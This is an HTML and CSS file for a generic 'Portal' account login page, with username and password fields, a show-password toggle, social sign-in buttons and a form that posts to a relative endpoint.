<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Account Portal Example</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif}
  body{background:#f5f6f7;min-height:100vh}
  .topbar{background:#e8edf5;height:56px;display:flex;align-items:center;padding:0 24px;border-bottom:1px solid #dde3ee;}
  .logo{display:flex;align-items:center;gap:10px;font-size:30px;font-weight:800;color:#25324a;margin-left:16%;}
  .logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#7ab8d6 0%,#4a7fc1 100%);border-radius:50%;display:grid;place-items:center;color:white;font-weight:900;position:relative;}
  .logo-icon::before{content:"";position:absolute;width:18px;height:18px;border:3px solid white;border-radius:4px;opacity:0.9;}
  .center{display:flex;justify-content:center;padding-top:32px;}
  .card{width:520px;background:#eef3fb;padding:28px 32px 20px;border-radius:4px;}
  .card h2{font-size:20px;font-weight:500;color:#2c3a52;margin-bottom:20px}
  label.title{display:block;font-size:13px;font-weight:700;color:#2c3a52;margin-bottom:6px;margin-top:10px}
  .input{width:100%;height:42px;border:1px solid #a9b8d0;border-radius:4px;padding:0 14px;font-size:14px;background:white;outline:none;}
  .input:focus{border-color:#2b5cb0;box-shadow:0 0 0 3px rgba(43,92,176,.12)}
  .pass-wrap{position:relative}
  .pass-wrap .input{padding-right:40px}
  .eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;}
  .remember{display:flex;align-items:center;gap:6px;margin:14px 0 8px;font-size:13px;color:#3a4a64}
  .remember input{width:16px;height:16px}
  .info{width:14px;height:14px;border:1px solid #8aa0c0;border-radius:50%;display:grid;place-items:center;font-size:9px;color:#6a7d9c}
  .links{display:flex;justify-content:center;gap:20px;margin:12px 0 16px}
  .links a{font-size:13px;color:#2b5cb0;font-weight:600;text-decoration:none}
  .links a:hover{text-decoration:underline}
  .btn-sign{width:100%;height:40px;background:#1e3a8a;border:none;border-radius:20px;color:white;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px;}
  .btn-sign:hover{background:#162e70}
  .or{text-align:center;margin:20px 0;color:#6a7d9c;font-size:14px}
  .btn-social{width:100%;height:44px;border-radius:22px;border:none;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;}
  .btn-apple{background:#1f2937;color:white}
  .btn-google{background:#f8fafc;border:1px solid #cbd5e1;color:#475569}
  .footer{border-top:1px solid #d6deeb;margin-top:20px;padding-top:16px;text-align:center}
  .footer p{font-size:13px;color:#6a7d9c;margin-bottom:4px}
  .footer a{font-size:13px;color:#2b5cb0;font-weight:700;text-decoration:none}
  .footer a:hover{text-decoration:underline}
  @media(max-width:700px){.logo{margin-left:0}.card{width:94%}}
</style>
</head>
<body>

<div class="topbar">
  <div class="logo"><div class="logo-icon">p</div> Portal</div>
</div>

<div class="center">
<div class="card">
  <h2>Log in to My Account</h2>

  <form id="loginForm" action="/api/get-result" method="POST">
    <label class="title">Username</label>
    <input class="input" type="text" name="username" placeholder="Enter your username" required>

    <label class="title">Password</label>
    <div class="pass-wrap">
      <input class="input" type="password" name="password" placeholder="Enter your password" id="pwd" required>
      <button type="button" class="eye" onclick="const p=document.getElementById('pwd'); p.type = p.type==='password'?'text':'password'">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b7a90" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
      </button>
    </div>

    <div class="remember">
      <input type="checkbox" id="rem" name="remember">
      <label for="rem">Remember me</label>
      <span class="info">i</span>
    </div>

    <div class="links">
      <a href="#">Forgot username?</a>
      <a href="#">Forgot password?</a>
    </div>

    <button type="submit" class="btn-sign" id="submitBtn">Sign In</button>
  </form>

  <div class="or">Or sign in with</div>

  <button type="button" class="btn-social btn-apple">Sign in with Apple</button>
  <button type="button" class="btn-social btn-google">Sign in with Google</button>

  <div class="footer">
    <p>Don't have an account profile?</p>
    <a href="#">Create one today</a>
  </div>
</div>
</div>

</body>
</html>
